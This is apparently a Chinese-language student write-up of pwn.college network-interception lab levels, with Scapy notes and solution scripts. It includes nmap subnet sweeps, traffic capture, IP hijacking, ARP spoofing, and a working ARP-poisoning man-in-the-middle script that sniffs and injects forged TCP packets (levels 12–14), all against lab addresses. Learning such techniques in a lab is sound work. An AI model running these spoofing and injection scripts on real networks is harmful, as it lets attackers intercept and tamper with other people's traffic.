# Scapy



 **`send`（发送网络层数据包）**

- **作用**：`send` 用于发送 **网络层**（Layer 3）数据包，通常用于发送 **IP 数据包** 或者是更高层协议（如 TCP、UDP）。
- **使用场景**：当你需要发送的数据包属于 **网络层**，例如包含 **IP 数据包**，并且你希望 Scapy 自动处理数据链路层的部分（如 Ethernet 帧）时，使用 `send`。

**`sendp`（发送链路层数据包）**

- **作用**：`sendp` 用于发送 **链路层**（Layer 2）数据包，也就是以太网帧或其他数据链路层协议的数据包。
- **使用场景**：当你需要发送的包包含 **Ethernet 帧** 或者是低层协议（如 ARP）时，应该使用 `sendp`。它允许你直接操作和发送数据链路层的数据包，不需要依赖网络层（如 IP）。

**区别总结**

- **`sendp`**：用于发送 **链路层** 数据包（例如：Ethernet、ARP、帧）。需要你自己构建完整的链路层数据包。
- **`send`**：用于发送 **网络层** 数据包（例如：IP、ICMP、TCP、UDP）。Scapy 会自动为你封装合适的链路层数据包（如 Ethernet 帧）。

**选择哪一个？**

- 如果你需要手动控制 **Ethernet 帧** 或其他链路层协议，选择 `sendp`。
- 如果你只关心 **网络层**（如 IP、ICMP、TCP 等），选择 `send`，Scapy 会帮你处理链路层的部分。



# Level 1

## 思路

使用nc连接

## 截图



![image-20241123193521586](./03%20Intercepting%20Communication.assets/image-20241123193521586.png)



# Level 2

## 思路

使用nc进行监听

## EXP

chatgpt的答案：

![image-20241123195621006](./03%20Intercepting%20Communication.assets/image-20241123195621006.png)

## 截图

![image-20241123195728055](./03%20Intercepting%20Communication.assets/image-20241123195728055.png)

# Level 3

## 思路

先用nmap扫描子网活跃主机

其中一个是我们自己

然后nc连接

## 截图

![image-20241123200621397](./03%20Intercepting%20Communication.assets/image-20241123200621397.png)





# Level 4

## 问题描述

> Find and connect to a remote host on a large network

## 思路

也就是说，在更大的子网范围内搜索存活主机。

但是范围太多了，所以要优化指令：

以下是一条经过优化的 `nmap` 命令，用于加快 `/16` 子网的主机发现：

```bash
$ nmap -n -sn --max-retries 1 --min-rate 5000 --min-parallelism 100 10.0.0.0/16
```

真他娘的快

# Level 5

## 前置知识

```
tcpdump -i any port 31337 -X 
```



> ### **命令含义分解**
>
> #### **1. `tcpdump`**
>
> 这是网络数据包捕获工具，用于监听和分析网络接口上的流量。它可以显示流量的详细信息，帮助调试网络问题。
>
> #### **2. `-i any`**
>
> 指定监听的网络接口：
>
> - **`-i`**：选择监听的网络接口。
>
> - `any`
>
>   ：表示监听所有网络接口（包括有线、无线、虚拟等接口）。
>
>   - 如果不指定接口，`tcpdump` 默认会选择第一个非回环（`lo`）接口。
>
> #### **3. `port 31337`**
>
> 过滤条件，指定只捕获目标端口的流量：
>
> - `port 31337`
>
>   ：只捕获源端口或目标端口为 
>
>   ```
>   31337
>   ```
>
>    的流量。
>
>   - 如果不加此条件，`tcpdump` 会捕获所有接口上的所有流量。
>
> #### **4. `-X`**
>
> 以更详细的格式显示数据包内容：
>
> - 显示每个数据包的 **十六进制（hex）** 和 **ASCII** 表示。
> - 用于查看数据包的负载内容，分析具体传输的数据。
>
> ------
>
> ### **命令作用总结**
>
> 这条命令的作用是：
>
> 1. **监听所有网络接口上的流量**（包括环回接口和虚拟网络）。
> 2. **仅捕获与端口 `31337` 相关的数据包**。
> 3. **以十六进制和 ASCII 格式展示数据包的详细内容**，便于进一步分析。



## EXP

就是端口被监听了

现在你需要处理监听的流量

```
tcpdump -i any port 31337 -X 
```

![image-20241123203703284](./03%20Intercepting%20Communication.assets/image-20241123203703284.png)



---



妈的真抽象

![image-20241123203635500](./03%20Intercepting%20Communication.assets/image-20241123203635500.png)

# Level 6

## 题目描述

> Monitor slow traffic from a remote host

## 思路

在discord上，看到了提示信息：

![image-20241124163454006](./03%20Intercepting%20Communication.assets/image-20241124163454006.png)

于是我就了解了，大概是，读取400多个流量包。然后每个流量包里有flag的一部分。将这些凑在一起，就是flag。

于是交给chatgpt帮我分析流量数据（我压根看不懂）。



---



使用tcpdump或者tshark（wireshark的cli版本）捕获流量包到本地（capture.pcap）

tshark：（获得几百个流量就差不多了）

```bash
root@ip-10-0-0-2:~# tshark -i any -f "port 31337" -w capture1.pcap
Running as user "root" and group "root". This could be dangerous.
Capturing on 'any'
746 ^C

root@ip-10-0-0-2:~# 
```

tcpdump：（多等一会儿）

```bash
root@ip-10-0-0-2:~# tcpdump -i any port 31337 -w capture.pcap
tcpdump: listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
^C940 packets captured
943 packets received by filter
0 packets dropped by kernel
root@ip-10-0-0-2:~# 
```

然后转到流量放到本地的文件里。

接着用tshark来进行流量分析：（tcpdump功能比较少）

```bash
$ tcpdump -i any port 31337 -w capture.pcap
```

但是只是显示16进制的数据。比较麻烦，我就直接找chatgpt去了。



---



（我直接使用chatgpt生成代码来处理数据）

```python
from scapy.all import rdpcap, TCP
import re

def extract_tcp_data_from_pcap(pcap_file, target_port):
    # 读取 pcap 文件
    packets = rdpcap(pcap_file)
    extracted_data = ""

    # 遍历所有数据包
    for pkt in packets:
        # 筛选出 TCP 包，并且检查是否与目标端口相关
        if TCP in pkt and (pkt[TCP].sport == target_port or pkt[TCP].dport == target_port):
            # 提取 TCP Payload
            if pkt[TCP].payload:
                try:
                    # 将 TCP Payload 转换为字符串
                    extracted_data += bytes(pkt[TCP].payload).decode('latin1', errors='ignore')
                except UnicodeDecodeError:
                    # 如果解码失败，忽略该部分数据
                    continue

    return extracted_data

def remove_duplicate_characters(data):
    # 使用正则表达式去重重复字符（每个字符最多出现一次）
    return re.sub(r"(.)\1+", r"\1", data)

# 主程序
if __name__ == "__main__":
    # 指定 pcap 文件和目标端口
    pcap_file = "capture.pcap"  # 替换为你的文件路径
    target_port = 31337

    # 提取并打印与目标端口相关的 TCP Payload 数据
    data = extract_tcp_data_from_pcap(pcap_file, target_port)

    # 去重重复字符
    clean_data = remove_duplicate_characters(data)

    print("Extracted Data:\n", clean_data)
```

处理这个数据包就够了。

主要是数据会重复，所以中间就是去重了一部分。

# Level 7

## 题目描述

> Hijack traffic from a remote host by configuring your network interface

## 思路

修改自己的ip为10.0.0.2，然后listen 31337端口，然后就收到10.0.0.4发来的flag。

我靠，真是开眼了。

这中间存在的指令是：

```
ip addr
```

我确实没有想到过，直接添加一个假的ip就可以了？

还有，chatgpt太多时候真心挺傻逼的。

## 截图

![image-20241124191303034](./03%20Intercepting%20Communication.assets/image-20241124191303034.png)

# Level 8

## 问题描述

> Manually send an Ethernet packet

## 思路

手动发送ethernet packet？

下一步是不是就是手动发ip包了？

还真是



注意，我们此时是没有ip的。也就是说，我们都只有mac地址。

我们只需要发送ether包，进行广播就可以了。



`ifconfig` 是一种旧的网络接口管理工具

`ip`是一个现代化的工具。

尽可能使用ip吧。

## EXP

```py
from scapy.all import *

# 创建自定义的以太网包
ethernet_frame = Ether(dst="ff:ff:ff:ff:ff:ff", type=0xFFFF)

conf.iface = "eth0"

# 发送包
sendp(ethernet_frame)
```



- `Ether(dst="ff:ff:ff:ff:ff:ff", type=0xFFFF)`：创建一个以太网帧，`dst` 为目标 MAC 地址（这里是广播地址 `ff:ff:ff:ff:ff:ff`，即向所有设备广播），`type=0xFFFF` 设置以太网帧的类型(可以忽略这个)。
- `sendp(ethernet_frame)`：发送这个以太网帧。

如果你需要对 `scapy` 进行高级配置（如指定网络接口），你可以通过 `conf.iface` 来指定发送包的接口。例如，假设你的接口是 `eth0`：

```py
conf.iface = "eth0"
```

## 截图

如下

![image-20241126213542402](./03%20Intercepting%20Communication.assets/image-20241126213542402.png)







# Level 9

## 问题描述

> Manually send an Internet Protocol packet

## 思路

那就是，继续使用scapy发送ip包

## EXP

```py
from scapy.all import *

# 构建数据包
ip_packet = IP(dst="10.0.0.3", proto=0xFF)

conf.iface = "eth0"

# 发送数据包
send(ip_packet)
```

- `IP(dst="10.0.0.3", proto=0xFF)`：构建一个目标地址为 `10.0.0.3`，协议为 `0xFF` 的 IP 数据包。
- `Raw(b"Hello, this is a custom packet!")`：附加自定义的原始数据（这部分可以根据需要修改）。

send会自动帮我们处理ether层的内容。

Raw要不要都可以。

## 截图

如下

![image-20241124194325763](./03%20Intercepting%20Communication.assets/image-20241124194325763.png)





# Level 10

## 问题描述

> Manually send a Transmission Control Protocol packet

## 思路

估计还是使用scapy

记住，TCP/UDP是什么？是传输层的协议。

应用层

传输层

网络层

数据链路层

物理层

## EXP

```py
from scapy.all import *

# 构建 TCP 数据包
tcp_packet = IP(dst="10.0.0.3") / TCP(sport=31337, dport=31337, seq=31337, ack=31337, flags="APRSF")

conf.iface = "eth0"

# 发送数据包
send(tcp_packet)
```



- `IP(dst="10.0.0.3")`：构建一个目标地址为 `10.0.0.3` 的 IP 数据包。
- `TCP(sport=31337, dport=31337, seq=31337, ack=31337, flags="APRSF")`：创建一个 TCP 数据包，设置源端口、目标端口、序列号、确认号，并设置标志位为 `APRSF`。
- `send(tcp_packet)`：发送构建好的数据包。

## 截图

如图

![image-20241124194824586](./03%20Intercepting%20Communication.assets/image-20241124194824586.png)

# Level 11

## 问题描述

> Manually perform a Transmission Control Protocol handshake

## 思路

问chatgpt，它什么都知道

## EXP

代码：

```py
from scapy.all import *

# 目标 IP 和端口
target_ip = "10.0.0.3"
target_port = 31337

# 步骤 1：发送 SYN 包
syn_packet = IP(dst=target_ip) / TCP(sport=31337, dport=target_port, seq=31337, flags="S")
syn_ack_response = sr1(syn_packet)  # 发送 SYN 包并等待响应

# 步骤 2：发送 SYN-ACK 包（如果接收到 SYN-ACK 响应）
if syn_ack_response and syn_ack_response.haslayer(TCP) and syn_ack_response[TCP].flags == "SA":
    ack_packet = IP(dst=target_ip) / TCP(sport=31337, dport=target_port, seq=syn_ack_response[TCP].ack, ack=syn_ack_response[TCP].seq + 1, flags="A")
    send(ack_packet)
    print("三次握手完成！")
else:
    print("没有收到有效的 SYN-ACK 响应，握手失败。")
```



## 截图

如图

![image-20241124195124551](./03%20Intercepting%20Communication.assets/image-20241124195124551.png)

## 总结

必须好好看看代码

# Level 12

## 问题描述

> Manually send an Address Resolution Protocol packet

## 思路

gpt

在你只知道ip，但是不知道对方的mac地址的时候，你就需要发送arp包，进行广播，获取到对方的mac地址。

`ARP op=is-at` 表示的是 ARP 响应（`op=2`），即目标 IP 地址对应的 MAC 地址。

注意，这里我们是发送响应包，而不是请求包。所以op=2

## EXP

```py
from scapy.all import *

# Your own IP and MAC address
sender_ip = "10.0.0.2"
sender_mac = "52:d0:05:72:2c:85"

# Target IP
target_ip = "10.0.0.3"

# Create the ARP reply
arp_reply = ARP(op=2, psrc=sender_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=sender_mac)

# Create Ethernet frame
ethernet_frame = Ether(dst="ff:ff:ff:ff:ff:ff")

# Combine Ethernet frame and ARP reply
packet = ethernet_frame / arp_reply

# Send the ARP reply on the correct network interface
sendp(packet, iface="eth0", verbose=False)

```

## 截图

如图

![image-20241124201743995](./03%20Intercepting%20Communication.assets/image-20241124201743995.png)

# Level 13

## 问题描述

> Hijack traffic from a remote host using ARP

## 思路

在一番思索和gpt的解释时候，我理解了这个攻击的方法：

首先，我们的ip和mac_addr是已知的。

然后10.0.0.2和10.0.0.4在通信。整个网络的ip和mac_addr的对应是正确的。

那么我们要改变10.0.0.4的ip mac对应的表。

让10.0.0.4发送给10.0.0.2的数据的mac地址改为我们自己的mac地址。

这样就会造成10.0.0.4的ip mac 对应table的混乱。

于是10.0.0.4发送给`IP:10.0.0.2 MAC:10.0.0.2的mac addr`的数据包就变为发送给`IP:10.0.0.2 MAC:10.0.0.3的mac addr`。于是我们就能收到10.0.0.4发送的flag。

可能我写的很混乱。也是在此刻才意识到自己网络知识的薄弱。

各种情绪五味杂陈。

这道题其中值得玩味的地方很多很多。



## EXP

```py
from scapy.all import *

sender_ip = "10.0.0.2"

sender_mac = "ea:07:6b:bf:a2:ee"

target_ip = "10.0.0.4"

arp_reply = ARP(op=2, psrc=sender_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=sender_mac)

ethernet_frame = Ether(dst="ff:ff:ff:ff:ff:ff")

packet = ethernet_frame / arp_reply

sendp(packet, iface="eth0", verbose=False)
```

随后，再开启31337端口listen即可

## 截图

如图

![image-20241124204821543](./03%20Intercepting%20Communication.assets/image-20241124204821543.png)

# Level 14

## 问题描述

> Man-in-the-middle traffic between two remote hosts and inject extra traffic



## 思路

我们没办法拦包修改再发送，而且这样做的话如果有时间戳的话就会出错。

所以我们就获取到包，然后修改后就发送，不影响之前的包。

也就是获取到COMMANDS:\nECHO\nFLAG\nCOMMAND:\n之后的，我们需要把ECHO修改为FLAG即可。

也可以试一试修改ECHO那个包。也许会更简单一点。

我是在接收到COMMANDS:\nECHO\nFLAG\nCOMMAND:\n之后自己写一个包。

## EXP

```py
from scapy.all import *
import time

sender_mac = get_if_hwaddr("eth0")

ip3 = "10.0.0.3"
ip4 = "10.0.0.4"

def cheat(srcip,dstip,sender_mac):
    arp_reply = ARP(op=2, psrc=srcip, pdst=dstip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=sender_mac)
    ethernet_frame = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ethernet_frame / arp_reply
    sendp(packet, iface="eth0", verbose=False)
    # print("------------------")
    # print(pkt[IP].src)
    # print(pkt[IP].dst)
    # print(pkt[TCP].flags)
    # pkt.show()
    # pkt.show()
    
def sniff_callback(pkt):
    print("-------------------------------------------")
    pkt.show()
    if pkt.haslayer(Raw) and bytes(pkt[TCP].payload) == b"COMMANDS:\nECHO\nFLAG\nCOMMAND:\n":
        # print("get it!")
        # print()
        # 构造一个伪造的TCP数据包
        fake_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) / TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="PA", seq=pkt[TCP].ack, ack=pkt[TCP].seq + 29) / Raw(load = b'FLAG\n')
        # fake_pkt2.show()
        send(fake_pkt, iface="eth0", verbose=False)
        print(f"Sent fake packet with payload: FAKE RESPONSE")

print("cheat finish")

cheat(ip3,ip4,sender_mac)
cheat(ip4,ip3,sender_mac)
print("go ahead")

sniff(filter="tcp", prn=sniff_callback, iface="eth0")
```

## 截图

![image-20241202173330765](./03%20Intercepting%20Communication.assets/image-20241202173330765.png)

## 总结

闹半天不过是FLAG\n写成FLAG/n，我他妈的真人麻了。

呜呜呜呜呜呜最后一块拼图终于拼上了。





# 本地运行挑战

这是我为这个level14专门学的东西。

本内容只限于本模块的挑战。

首先是pwn.college有一个叫做pwnshop的工具。

虽然我不知道在我本次探索中是否能用到。大概是把pwn.college的python给拿过来？

所以先说虚拟环境吧。

首先要开启一个python的虚拟环境。

然后安装pwnshop。

![image-20241129153413427](./03%20Intercepting%20Communication.assets/image-20241129153413427.png)

安装pwnshop（注意python的路径）

![image-20241129153559711](./03%20Intercepting%20Communication.assets/image-20241129153559711.png)

多了一大堆东西

切换到对应的目录运行即可（比如第14道题目）

![image-20241129153834297](./03%20Intercepting%20Communication.assets/image-20241129153834297.png)

如果是我们本机的python的话，其实也能运行。我靠，为什么呢？

而且本机没有安装pwnshop

![image-20241129154126869](./03%20Intercepting%20Communication.assets/image-20241129154126869.png)

然后运行脚本也能成功。

我靠，牛逼了。

